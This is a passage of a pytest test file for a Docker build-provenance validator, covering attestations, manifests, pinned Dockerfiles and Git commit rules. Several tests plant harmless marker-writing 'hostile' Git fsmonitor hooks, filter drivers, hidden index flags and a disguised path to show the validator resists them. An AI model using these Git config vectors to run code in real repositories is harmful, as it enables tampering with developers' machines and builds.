from __future__ import annotations

import copy
import hashlib
import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[3]
MODULE_PATH = ROOT / "scripts/validate_whoscored_build_provenance.py"
GATE_PATH = ROOT / "docker/images/airflow/whoscored_production_gate.py"
SPEC = importlib.util.spec_from_file_location(
    "validate_whoscored_build_provenance", MODULE_PATH
)
assert SPEC is not None and SPEC.loader is not None
provenance = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = provenance
SPEC.loader.exec_module(provenance)

SHA_A = "a" * 64
SHA_B = "b" * 64
SHA_C = "c" * 64
COMMIT = "1" * 40
APT_OPTIONS = (
    "-o Dir::Etc::sourcelist=/etc/apt/sources.list "
    "-o Dir::Etc::sourceparts=- "
    "-o Dir::Etc::main=- "
    "-o Dir::Etc::parts=- "
    "-o Dir::State::lists=/var/lib/apt/lists"
)
APT_COMMAND = f"APT_CONFIG=/dev/null apt-get {APT_OPTIONS}"
APT_SOURCE_SETUP = (
    "rm -rf /etc/apt/sources.list.d /var/lib/apt/lists/* && "
    "printf '%s\\n' 'deb https://snapshot.debian.org/archive/debian/"
    "20240101T000000Z bookworm main' >/etc/apt/sources.list"
)
APT_RUN = (
    f"RUN {APT_SOURCE_SETUP} && {APT_COMMAND} update && "
    f"{APT_COMMAND} install -y --no-install-recommends "
    "ca-certificates=20230311 && rm -rf /var/lib/apt/lists/*"
)
SNAPSHOT_RELEASE_URL = (
    "https://snapshot.debian.org/archive/debian/20240101T000000Z/dists/bookworm/Release"
)
DOWNLOAD_RUN = (
    f"RUN curl -fsSL {SNAPSHOT_RELEASE_URL} -o /tmp/Release && "
    f'echo "{SHA_B}  /tmp/Release" | sha256sum -c - && '
    'test "$(stat -c %s /tmp/Release)" -eq 1234'
)
BOUNDED_CURL_FLAGS = (
    "--proto '=https' --tlsv1.2 --proto-redir '=https' "
    "--connect-timeout 20 --speed-limit 1024 --speed-time 60 "
    "--max-time 3600 -fsSL"
)

def _write(path: Path, value: str | bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(value, bytes):
        path.write_bytes(value)
    else:
        path.write_text(value, encoding="utf-8")


def _canonical(path: Path, value: object) -> bytes:
    raw = provenance.canonical_bytes(value)
    _write(path, raw)
    return raw


def _protected_command(service: str) -> str:
    if service == "airflow-scheduler":
        return "    command: scheduler\n"
    if service == "whoscored_proxy_filter":
        values = "\n".join(
            f"      - {json.dumps(value)}"
            for value in provenance.WHOSCORED_PROXY_COMMAND
        )
        return f"    command:\n{values}\n"
    if service == "whoscored_paid_gateway":
        values = "\n".join(
            f"      - {json.dumps(value)}"
            for value in provenance.WHOSCORED_PAID_GATEWAY_COMMAND
        )
        return f"    command:\n{values}\n"
    return ""


def test_paid_boundary_protects_five_services_with_shared_payload_mappings():
    assert provenance.PROTECTED_PRODUCTION_SERVICES == {
        "airflow-scheduler",
        "flaresolverr",
        "flaresolverr_whoscored_paid",
        "whoscored_paid_gateway",
        "whoscored_proxy_filter",
    }
    assert provenance.PROTECTED_SERVICE_BUILDS["flaresolverr_whoscored_paid"] == (
        provenance.PROTECTED_SERVICE_BUILDS["flaresolverr"]
    )
    assert provenance.PROTECTED_SERVICE_BUILDS["whoscored_paid_gateway"] == (
        provenance.PROTECTED_SERVICE_BUILDS["whoscored_proxy_filter"]
    )
    assert provenance.PROTECTED_SERVICE_FINAL_TARGETS[
        "whoscored_paid_gateway"
    ] == "airflow-whoscored-proxy"
    assert provenance.PROTECTED_STAGE_RECIPE_SHA256[
        "flaresolverr_whoscored_paid"
    ] == provenance.PROTECTED_STAGE_RECIPE_SHA256["flaresolverr"]
    assert provenance.PROTECTED_STAGE_RECIPE_SHA256[
        "whoscored_paid_gateway"
    ] == provenance.PROTECTED_STAGE_RECIPE_SHA256["whoscored_proxy_filter"]
    assert provenance.PROTECTED_STAGE_RECIPE_SHA256["airflow-scheduler"] == (
        "f784ae95f5ac83d33cd52866e81a406a23cdb65fbdad3912168cd3ed85cabe6d"
    )


def _git(root: Path, *arguments: str) -> str:
    result = subprocess.run(
        ("git", "-C", str(root), *arguments),
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def _load_gate():
    spec = importlib.util.spec_from_file_location(
        "validator_integration_gate", GATE_PATH
    )
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _ready_repository(
    tmp_path: Path, *, commit_promotion: bool = True
) -> tuple[Path, Path, Path, dict[str, object]]:
    root = tmp_path / "repository"
    airflow = root / "docker/images/airflow"
    workflow = root / ".github/workflows/whoscored-ci.yml"
    attestation_path = airflow / "whoscored-build-provenance-attestation.json"
    manifest_path = airflow / "whoscored-build-provenance-manifest.json"
    deployment_path = tmp_path / "external-deployment-attestation.json"

    _write(
        root / "compose.yaml",
        f"""services:
  scheduler:
    image: local/whoscored:test
    build:
      context: ./docker/images/airflow
      dockerfile: Dockerfile
      target: runtime
  database:
    image: postgres:16@sha256:{SHA_B}
""",
    )
    _write(
        airflow / "Dockerfile",
        f"""FROM python:3.11@sha256:{SHA_A} AS runtime-payload
USER root
{DOWNLOAD_RUN}
{APT_RUN}
COPY airflow.lock /tmp/airflow.lock
COPY legacy.lock /tmp/legacy.lock
RUN pip install --require-hashes --only-binary=:all: -r /tmp/airflow.lock
RUN /opt/legacy-scraper-venv/bin/pip install --require-hashes --only-binary=:all: -r /tmp/legacy.lock
FROM runtime-payload AS runtime
COPY whoscored-build-provenance-attestation.json /evidence/attestation.json
COPY whoscored-build-provenance-manifest.json /evidence/manifest.json
""",
    )
    _write(airflow / "airflow.lock", f"requests==2.32.4 --hash=sha256:{SHA_A}\n")
    _write(airflow / "legacy.lock", f"camoufox==0.4.11 --hash=sha256:{SHA_B}\n")
    _write(root / "ci.lock", f"ruff==0.12.2 --hash=sha256:{SHA_C}\n")
    _write(
        workflow,
        f"""name: immutable
on: [pull_request]
jobs:
  contract:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{COMMIT}
      - run: python -m pip install --require-hashes --only-binary=:all: -r ci.lock
""",
    )
    _write(root / "compose.seaweedfs-supervised.yaml", "services:\n")
    _canonical(
        attestation_path,
        {
            "schema_version": 1,
            "status": "blocked-v1",
            "provenance_manifest_sha256": "",
        },
    )
    _canonical(manifest_path, {"schema_version": 1, "status": "blocked-v1"})
    # source_revision names the payload commit.  The child commit is restricted
    # to the two generated provenance outputs, avoiding a Git hash fixed point.
    _git(root, "init", "-q")
    _git(root, "config", "user.email", "provenance@example.invalid")
    _git(root, "config", "user.name", "Provenance Test")
    _git(root, "add", ".")
    _git(root, "commit", "-qm", "payload")
    payload_id = f"sha256:{SHA_B}"
    receipt = provenance.generate_ready_evidence(
        root,
        payload_image_ids={"scheduler": payload_id},
        generated_at="2026-07-16T12:00:00Z",
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest_digest = str(receipt["provenance_manifest_sha256"])
    assert hashlib.sha256(manifest_path.read_bytes()).hexdigest() == manifest_digest
    if commit_promotion:
        _git(
            root,
            "add",
            str(provenance.ATTESTATION_RELATIVE),
            str(provenance.MANIFEST_RELATIVE),
        )
        _git(root, "commit", "-qm", "provenance promotion")
    _canonical(
        deployment_path,
        {
            "schema_version": 1,
            "status": "ready-v1",
            "provenance_manifest_sha256": manifest_digest,
            "images": [
                {
                    "service": "scheduler",
                    "payload_image_id": payload_id,
                    "final_image": f"registry.example/whoscored@sha256:{SHA_C}",
                }
            ],
        },
    )
    return root, manifest_path, deployment_path, manifest


def _promote_mutated_manifest(
    root: Path,
    manifest_path: Path,
    deployment_path: Path,
    manifest: dict[str, object],
) -> None:
    raw = _canonical(manifest_path, manifest)
    digest = hashlib.sha256(raw).hexdigest()
    _canonical(
        root / provenance.ATTESTATION_RELATIVE,
        {
            "schema_version": 1,
            "status": "ready-v1",
            "provenance_manifest_sha256": digest,
        },
    )
    deployment = json.loads(deployment_path.read_text(encoding="utf-8"))
    deployment["provenance_manifest_sha256"] = digest
    _canonical(deployment_path, deployment)
    _git(
        root,
        "add",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    _git(root, "commit", "--amend", "--no-edit", "-q")


def test_current_repository_evidence_matches_its_declared_state() -> None:
    attestation_path = ROOT / provenance.ATTESTATION_RELATIVE
    manifest_path = ROOT / provenance.MANIFEST_RELATIVE
    attestation = json.loads(attestation_path.read_text(encoding="utf-8"))
    if attestation.get("status") == "blocked-v1":
        discovery = provenance.validate(
            ROOT,
            attestation_path=attestation_path,
            manifest_path=manifest_path,
            deployment_attestation_path=None,
            expect_blocked=True,
        )
        assert discovery.report["status"] == "blocked-v1"
        assert discovery.issues
    elif attestation.get("status") == "ready-v1":
        discovery = provenance.validate_ready_build_evidence(
            ROOT,
            attestation_path=attestation_path,
            manifest_path=manifest_path,
        )
        assert discovery.report["status"] == "ready-v1"
        assert discovery.issues == []
    else:
        pytest.fail("repository attestation has an unsupported state")
    assert provenance.canonical_bytes(discovery.report).endswith(b"\n")
    workflow = (ROOT / ".github/workflows/whoscored-ci.yml").read_text(encoding="utf-8")
    assert "scripts/validate_whoscored_build_provenance.py" in workflow
    assert "--expect-blocked" in workflow
    assert "--expect-ready-build" in workflow


def test_declared_repository_mode_emits_report_but_default_rejects_without_deployment(
    capsys: pytest.CaptureFixture[str],
) -> None:
    attestation = json.loads(
        (ROOT / provenance.ATTESTATION_RELATIVE).read_text(encoding="utf-8")
    )
    mode = (
        "--expect-blocked"
        if attestation.get("status") == "blocked-v1"
        else "--expect-ready-build"
    )
    assert provenance.main(["--root", str(ROOT), mode]) == 0
    output = capsys.readouterr()
    assert json.loads(output.out)["status"] == attestation["status"]

    assert provenance.main(["--root", str(ROOT)]) == provenance.EXIT_CONFIG
    output = capsys.readouterr()
    assert output.out == ""
    assert "build provenance blocked" in output.err


@pytest.mark.parametrize(
    "invalid", ["missing", "ignored", "duplicate-key", "noncanonical"]
)
def test_blocked_attestation_must_be_present_tracked_and_canonical(
    tmp_path: Path, invalid: str
) -> None:
    root = tmp_path / "repository"
    attestation = root / provenance.ATTESTATION_RELATIVE
    if invalid != "missing":
        _write(
            attestation,
            '{"provenance_manifest_sha256":"","schema_version":1,"status":"blocked-v1"}\n',
        )
    if invalid == "ignored":
        _write(root / ".gitignore", "*.json\n")
    elif invalid == "duplicate-key":
        _write(
            attestation,
            '{"provenance_manifest_sha256":"","schema_version":1,"schema_version":1,"status":"blocked-v1"}\n',
        )
    elif invalid == "noncanonical":
        _write(
            attestation,
            '{"schema_version": 1, "status": "blocked-v1", "provenance_manifest_sha256": ""}\n',
        )

    with pytest.raises(provenance.ProvenanceError):
        provenance.validate(
            root,
            attestation_path=attestation,
            manifest_path=root / provenance.MANIFEST_RELATIVE,
            deployment_attestation_path=None,
            expect_blocked=True,
        )


def test_ready_manifest_and_external_deployment_binding_are_accepted(
    tmp_path: Path,
) -> None:
    root, manifest_path, deployment_path, _ = _ready_repository(tmp_path)

    discovery = provenance.validate(
        root,
        attestation_path=root / provenance.ATTESTATION_RELATIVE,
        manifest_path=manifest_path,
        deployment_attestation_path=deployment_path,
        expect_blocked=False,
    )

    assert discovery.report["status"] == "ready-v1"
    assert discovery.issues == []
    assert discovery.records["local_images"][0]["target"] == "runtime"
    assert discovery.records["local_images"][0]["payload_image_id"] == f"sha256:{SHA_B}"
    assert discovery.records["local_images"][0]["payload_target"] == "runtime-payload"

    attestation_path = root / provenance.ATTESTATION_RELATIVE
    manifest_path.chmod(0o444)
    attestation_path.chmod(0o444)
    gate = _load_gate()
    assert (
        gate.validate_production_attestation(
            attestation_path,
            manifest_path,
            expected_uid=manifest_path.stat().st_uid,
            enforce_immutable_parents=False,
        )
        == hashlib.sha256(manifest_path.read_bytes()).hexdigest()
    )


def test_ready_manifest_still_requires_external_final_digest(tmp_path: Path) -> None:
    root, manifest_path, _, _ = _ready_repository(tmp_path)

    with pytest.raises(provenance.ProvenanceError, match="external deployment"):
        provenance.validate(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
            deployment_attestation_path=None,
            expect_blocked=False,
        )


def test_ready_build_rejects_external_build_evidence_paths(tmp_path: Path) -> None:
    root, manifest_path, deployment_path, _ = _ready_repository(tmp_path)
    external_attestation = tmp_path / "external-build-attestation.json"
    external_manifest = tmp_path / "external-build-manifest.json"
    _write(
        external_attestation,
        (root / provenance.ATTESTATION_RELATIVE).read_bytes(),
    )
    _write(external_manifest, manifest_path.read_bytes())

    with pytest.raises(provenance.ProvenanceError, match="canonical repository paths"):
        provenance.validate(
            root,
            attestation_path=external_attestation,
            manifest_path=external_manifest,
            deployment_attestation_path=deployment_path,
            expect_blocked=False,
        )


def test_ready_build_cli_verifies_without_authorizing_deployment(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    root, manifest_path, _, _ = _ready_repository(tmp_path)

    assert (
        provenance.main(["--root", str(root), "--expect-ready-build"])
        == 0
    )
    output = capsys.readouterr()
    assert json.loads(output.out)["status"] == "ready-v1"
    assert output.err == ""
    assert provenance.main(
        [
            "--root",
            str(root),
            "--expect-ready-build",
            "--manifest",
            str(manifest_path),
        ]
    ) == provenance.EXIT_CONFIG
    assert "canonical repository evidence" in capsys.readouterr().err


def test_ready_build_validates_exact_pr_head_from_clean_merge_checkout(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    root, manifest_path, _, manifest = _ready_repository(tmp_path)
    ready_head = _git(root, "rev-parse", "HEAD")
    payload_revision = str(manifest["source_revision"])
    _git(root, "checkout", "-qb", "synthetic-base", payload_revision)
    _write(root / "merge-only-readme.txt", "merge result coverage\n")
    _git(root, "add", "merge-only-readme.txt")
    _git(root, "commit", "-qm", "synthetic base update")
    _git(root, "merge", "--no-ff", "-qm", "synthetic PR merge", ready_head)

    with pytest.raises(provenance.ProvenanceError, match="single-parent"):
        provenance.validate_ready_build_evidence(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
        )
    discovery = provenance.validate_ready_build_evidence(
        root,
        attestation_path=root / provenance.ATTESTATION_RELATIVE,
        manifest_path=manifest_path,
        release_revision=ready_head,
    )
    assert discovery.report["status"] == "ready-v1"
    assert discovery.revision == payload_revision
    assert provenance.main(
        [
            "--root",
            str(root),
            "--expect-ready-build",
            "--release-revision",
            ready_head,
        ]
    ) == 0
    assert json.loads(capsys.readouterr().out)["status"] == "ready-v1"

    mutated = json.loads(manifest_path.read_text(encoding="utf-8"))
    mutated["generated_at"] = "2026-07-16T12:00:01Z"
    mutated_raw = _canonical(manifest_path, mutated)
    _canonical(
        root / provenance.ATTESTATION_RELATIVE,
        {
            "provenance_manifest_sha256": hashlib.sha256(mutated_raw).hexdigest(),
            "schema_version": 1,
            "status": "ready-v1",
        },
    )
    _git(
        root,
        "add",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    _git(root, "commit", "--amend", "--no-edit", "-q")
    with pytest.raises(provenance.ProvenanceError, match="selected release commit"):
        provenance.validate_ready_build_evidence(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
            release_revision=ready_head,
        )


def test_generate_ready_is_manifest_first_resumable_and_idempotent(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root, manifest_path, _, _ = _ready_repository(
        tmp_path, commit_promotion=False
    )
    attestation_path = root / provenance.ATTESTATION_RELATIVE
    _git(
        root,
        "restore",
        "--",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    original = provenance._replace_regular_file
    writes: list[str] = []

    def interrupt_attestation(path: Path, raw: bytes, *, label: str) -> None:
        writes.append(label)
        if label == "build attestation":
            raise provenance.ProvenanceError("simulated publication interruption")
        original(path, raw, label=label)

    monkeypatch.setattr(provenance, "_replace_regular_file", interrupt_attestation)
    with pytest.raises(provenance.ProvenanceError, match="simulated"):
        provenance.generate_ready_evidence(
            root,
            payload_image_ids={"scheduler": f"sha256:{SHA_B}"},
            generated_at="2026-07-16T12:00:00Z",
        )
    assert writes == ["build manifest", "build attestation"]
    assert json.loads(attestation_path.read_text(encoding="utf-8"))["status"] == (
        "blocked-v1"
    )
    assert json.loads(manifest_path.read_text(encoding="utf-8"))["generated_at"] == (
        "2026-07-16T12:00:00Z"
    )

    monkeypatch.setattr(provenance, "_replace_regular_file", original)
    receipt = provenance.generate_ready_evidence(
        root,
        payload_image_ids={"scheduler": f"sha256:{SHA_B}"},
        generated_at="2026-07-17T09:30:00Z",
    )
    assert receipt["status"] == "ready-generated-v1"
    assert json.loads(attestation_path.read_text(encoding="utf-8"))["status"] == (
        "ready-v1"
    )
    before = (manifest_path.read_bytes(), attestation_path.read_bytes())
    assert provenance.generate_ready_evidence(
        root,
        payload_image_ids={"scheduler": f"sha256:{SHA_B}"},
        generated_at="2026-07-18T10:45:00Z",
    ) == receipt
    assert (manifest_path.read_bytes(), attestation_path.read_bytes()) == before


@pytest.mark.parametrize(
    "failure", ["dirty", "missing-id", "extra-id", "untracked-evidence"]
)
def test_generate_ready_fails_closed_before_evidence_change(
    tmp_path: Path, failure: str
) -> None:
    root, manifest_path, _, _ = _ready_repository(
        tmp_path, commit_promotion=False
    )
    attestation_path = root / provenance.ATTESTATION_RELATIVE
    _git(
        root,
        "restore",
        "--",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    before = (manifest_path.read_bytes(), attestation_path.read_bytes())
    payloads = {"scheduler": f"sha256:{SHA_B}"}
    if failure == "dirty":
        _write(root / "unexpected.txt", "dirty\n")
    elif failure == "missing-id":
        payloads.clear()
    elif failure == "extra-id":
        payloads["not-a-service"] = f"sha256:{SHA_C}"
    else:
        _git(
            root,
            "rm",
            "--cached",
            "--",
            str(provenance.MANIFEST_RELATIVE),
        )

    with pytest.raises(provenance.ProvenanceError):
        provenance.generate_ready_evidence(
            root,
            payload_image_ids=payloads,
            generated_at="2026-07-16T12:00:00Z",
        )
    assert (manifest_path.read_bytes(), attestation_path.read_bytes()) == before


def test_generate_ready_requires_blocked_pair_in_payload_commit(tmp_path: Path) -> None:
    root, manifest_path, _, _ = _ready_repository(
        tmp_path, commit_promotion=False
    )
    attestation_path = root / provenance.ATTESTATION_RELATIVE
    _git(
        root,
        "restore",
        "--",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    _git(
        root,
        "rm",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    _git(root, "commit", "-qm", "payload without blocked evidence")
    _canonical(
        attestation_path,
        {
            "provenance_manifest_sha256": "",
            "schema_version": 1,
            "status": "blocked-v1",
        },
    )
    _canonical(manifest_path, {"schema_version": 1, "status": "blocked-v1"})
    _git(
        root,
        "add",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )

    with pytest.raises(provenance.ProvenanceError, match="does not contain"):
        provenance.generate_ready_evidence(
            root,
            payload_image_ids={"scheduler": f"sha256:{SHA_B}"},
            generated_at="2026-07-16T12:00:00Z",
        )


def test_generate_ready_rejects_stacked_ready_parent(tmp_path: Path) -> None:
    root, manifest_path, _, _ = _ready_repository(tmp_path)
    attestation_path = root / provenance.ATTESTATION_RELATIVE
    _canonical(
        attestation_path,
        {
            "provenance_manifest_sha256": "",
            "schema_version": 1,
            "status": "blocked-v1",
        },
    )
    _canonical(manifest_path, {"schema_version": 1, "status": "blocked-v1"})

    with pytest.raises(provenance.ProvenanceError, match="exact canonical blocked"):
        provenance.generate_ready_evidence(
            root,
            payload_image_ids={"scheduler": f"sha256:{SHA_B}"},
            generated_at="2026-07-17T12:00:00Z",
        )


def test_generate_ready_requires_regular_blocked_parent_files(tmp_path: Path) -> None:
    root, manifest_path, _, _ = _ready_repository(
        tmp_path, commit_promotion=False
    )
    _git(
        root,
        "restore",
        "--",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    manifest_path.unlink()
    manifest_path.symlink_to(provenance.BLOCKED_MANIFEST_BYTES.decode("utf-8"))
    _git(root, "add", str(provenance.MANIFEST_RELATIVE))
    _git(root, "commit", "-qm", "payload with symlinked blocked manifest")
    manifest_path.unlink()
    _canonical(manifest_path, {"schema_version": 1, "status": "blocked-v1"})

    with pytest.raises(provenance.ProvenanceError, match="not a regular"):
        provenance.generate_ready_evidence(
            root,
            payload_image_ids={"scheduler": f"sha256:{SHA_B}"},
            generated_at="2026-07-16T12:00:00Z",
        )


def test_promotion_revision_rejects_ready_parent_even_with_two_file_child(
    tmp_path: Path,
) -> None:
    root, manifest_path, _, _ = _ready_repository(tmp_path)
    ready_parent = _git(root, "rev-parse", "HEAD")
    attestation_path = root / provenance.ATTESTATION_RELATIVE
    _write(manifest_path, '{"schema_version":1,"status":"changed"}\n')
    _write(attestation_path, '{"schema_version":1,"status":"changed"}\n')
    _git(
        root,
        "add",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    _git(root, "commit", "-qm", "stacked evidence child")

    with pytest.raises(provenance.ProvenanceError, match="exact canonical blocked"):
        provenance._validate_promotion_revision(root, ready_parent)


def test_promotion_revision_rejects_space_prefixed_third_path(tmp_path: Path) -> None:
    root, _, _, manifest = _ready_repository(tmp_path, commit_promotion=False)
    payload_revision = str(manifest["source_revision"])
    disguised = (
        root
        / " docker/images/airflow/whoscored-build-provenance-attestation.json"
    )
    _write(disguised, "unexpected\n")
    _git(
        root,
        "add",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
        str(disguised.relative_to(root)),
    )
    _git(root, "commit", "-qm", "promotion with disguised third path")

    with pytest.raises(provenance.ProvenanceError, match="outside the two"):
        provenance._validate_promotion_revision(root, payload_revision)


@pytest.mark.parametrize("flag", ["--assume-unchanged", "--skip-worktree"])
def test_generate_ready_rejects_hidden_index_material(
    tmp_path: Path, flag: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path, commit_promotion=False)
    _git(
        root,
        "restore",
        "--",
        str(provenance.ATTESTATION_RELATIVE),
        str(provenance.MANIFEST_RELATIVE),
    )
    _git(root, "update-index", flag, "compose.yaml")
    _write(root / "compose.yaml", "services:\n  hidden: {}\n")

    with pytest.raises(provenance.ProvenanceError, match="Git index contains"):
        provenance.generate_ready_evidence(
            root,
            payload_image_ids={"scheduler": f"sha256:{SHA_B}"},
            generated_at="2026-07-16T12:00:00Z",
        )


def test_ready_build_rejects_hidden_index_material(tmp_path: Path) -> None:
    root, manifest_path, _, _ = _ready_repository(tmp_path)
    _git(root, "update-index", "--assume-unchanged", "compose.yaml")
    _write(root / "compose.yaml", "services:\n  hidden: {}\n")

    with pytest.raises(provenance.ProvenanceError, match="Git index contains"):
        provenance.validate_ready_build_evidence(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
        )


def test_generate_ready_cli_rejects_output_override_and_duplicate_binding(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    root, _, _, _ = _ready_repository(tmp_path, commit_promotion=False)
    common = [
        "--root",
        str(root),
        "--generate-ready",
        "--generated-at",
        "2026-07-16T12:00:00Z",
        "--payload-image-id",
        f"scheduler=sha256:{SHA_B}",
    ]
    assert provenance.main([*common, "--manifest", str(tmp_path / "other")]) == 78
    assert "canonical output paths" in capsys.readouterr().err
    assert provenance.main(
        [*common, "--payload-image-id", f"scheduler=sha256:{SHA_C}"]
    ) == 78
    assert "duplicated or invalid" in capsys.readouterr().err
    assert provenance.main(common) == 78
    assert "isolated Python -I -S" in capsys.readouterr().err
    result = subprocess.run(
        (sys.executable, "-I", "-S", str(MODULE_PATH), *common),
        check=False,
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout)["status"] == "ready-generated-v1"
    assert result.stderr == ""


def test_standalone_generate_ready_disables_hostile_local_fsmonitor(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path, commit_promotion=False)
    hook = tmp_path / "hostile-fsmonitor"
    marker = Path(f"{hook}.ran")
    _write(hook, '#!/bin/sh\ntouch "$0.ran"\nprintf "\\n"\n')
    hook.chmod(0o755)
    _git(root, "config", "core.fsmonitor", str(hook))

    subprocess.run(
        ("/usr/bin/git", "-C", str(root), "ls-files", "-v", "-z", "--"),
        check=True,
        stdout=subprocess.DEVNULL,
    )
    assert marker.is_file()
    marker.unlink()

    result = subprocess.run(
        (
            sys.executable,
            "-I",
            "-S",
            str(MODULE_PATH),
            "--root",
            str(root),
            "--generate-ready",
            "--generated-at",
            "2026-07-16T12:00:00Z",
            "--payload-image-id",
            f"scheduler=sha256:{SHA_B}",
        ),
        check=False,
        capture_output=True,
        text=True,
    )

    assert result.returncode == 0, result.stderr
    assert not marker.exists()
    assert json.loads(result.stdout)["status"] == "ready-generated-v1"


def test_empty_attribute_tree_never_writes_a_fresh_repository_object(
    tmp_path: Path,
) -> None:
    root = tmp_path / "empty-repository"
    root.mkdir()
    _git(root, "init", "-q")
    objects = root / ".git/objects"
    before = {
        path.relative_to(objects)
        for path in objects.rglob("*")
        if path.is_file()
    }
    assert before == set()

    result = provenance._run_git(
        root, "ls-files", "-z", "--", stdout=provenance._SUBPROCESS_PIPE
    )

    after = {
        path.relative_to(objects)
        for path in objects.rglob("*")
        if path.is_file()
    }
    assert result.returncode == 0
    assert result.stdout == b""
    assert after == before


def test_material_revision_compares_raw_bytes_despite_local_autocrlf(
    tmp_path: Path,
) -> None:
    root = tmp_path / "autocrlf-repository"
    payload = root / "payload.txt"
    _write(payload, b"line\n")
    _git(root, "init", "-q")
    _git(root, "config", "user.email", "provenance@example.invalid")
    _git(root, "config", "user.name", "Provenance Test")
    _git(root, "add", "payload.txt")
    _git(root, "commit", "-qm", "base")
    revision = _git(root, "rev-parse", "HEAD")
    _git(root, "config", "core.autocrlf", "true")
    _write(payload, b"line\r\n")

    unprotected = subprocess.run(
        (
            "/usr/bin/git",
            "-C",
            str(root),
            "diff",
            "--quiet",
            revision,
            "--",
            "payload.txt",
        ),
        check=False,
    )
    assert unprotected.returncode == 0
    assert payload.read_bytes() == b"line\r\n"
    assert provenance._git_blob(root, revision, payload) == b"line\n"

    assert not provenance._git_evidence_is_checked_against(
        root, "payload.txt", revision
    )
    with pytest.raises(provenance.ProvenanceError, match="differs"):
        provenance._validate_material_revision(root, revision, [payload])


@pytest.mark.parametrize("filter_kind", ["clean", "process"])
@pytest.mark.parametrize("attribute_source", ["tracked", "untracked", "info"])
def test_pinned_git_never_runs_repository_selected_filter(
    tmp_path: Path, filter_kind: str, attribute_source: str
) -> None:
    root = tmp_path / "filter-repository"
    payload = root / "payload.txt"
    attributes = root / ".gitattributes"
    _write(payload, "base\n")
    if attribute_source == "tracked":
        _write(attributes, "* filter=demo\n")
    _git(root, "init", "-q")
    _git(root, "config", "user.email", "provenance@example.invalid")
    _git(root, "config", "user.name", "Provenance Test")
    _git(root, "add", ".")
    _git(root, "commit", "-qm", "base")
    if attribute_source == "untracked":
        _write(attributes, "* filter=demo\n")
    elif attribute_source == "info":
        _write(root / ".git/info/attributes", "* filter=demo\n")

    hook = tmp_path / f"hostile-{filter_kind}-{attribute_source}"
    marker = Path(f"{hook}.ran")
    _write(hook, '#!/bin/sh\ntouch "$0.ran"\nexit 1\n')
    hook.chmod(0o755)
    _git(root, "config", f"filter.demo.{filter_kind}", str(hook))
    _write(payload, "changed\n")

    subprocess.run(
        (
            "/usr/bin/git",
            "-C",
            str(root),
            "diff",
            "--quiet",
            "HEAD",
            "--",
            "payload.txt",
        ),
        check=False,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    assert marker.is_file()
    marker.unlink()

    if attribute_source == "info":
        with pytest.raises(provenance.ProvenanceError, match="info attributes"):
            provenance._run_git(
                root, "diff", "--quiet", "HEAD", "--", "payload.txt"
            )
    else:
        result = provenance._run_git(
            root, "diff", "--quiet", "HEAD", "--", "payload.txt"
        )
        assert result.returncode == 1
    assert not marker.exists()


@pytest.mark.parametrize("mutation", ["duplicate", "extra", "missing"])
def test_ready_manifest_rejects_duplicate_extra_and_missing_records(
    tmp_path: Path, mutation: str
) -> None:
    root, manifest_path, deployment_path, manifest = _ready_repository(tmp_path)
    records = copy.deepcopy(manifest["apt_packages"])
    assert isinstance(records, list)
    if mutation == "duplicate":
        records.append(copy.deepcopy(records[0]))
    elif mutation == "extra":
        records.append({"name": "extra-package", "version": "1.0"})
    else:
        records.clear()
    manifest["apt_packages"] = records
    _promote_mutated_manifest(root, manifest_path, deployment_path, manifest)

    with pytest.raises(provenance.ProvenanceError, match="duplicate, extra, missing"):
        provenance.validate(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
            deployment_attestation_path=deployment_path,
            expect_blocked=False,
        )


def test_context_digest_excludes_only_generated_provenance_outputs(
    tmp_path: Path,
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    context = root / "docker/images/airflow"
    before = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    ).records["local_images"][0]["context_sha256"]

    _write(context / "whoscored-build-provenance-manifest.json", b"generated-change\n")
    after_generated = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    ).records["local_images"][0]["context_sha256"]
    _write(context / ".untracked-cache", b"material-change\n")
    after_material = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
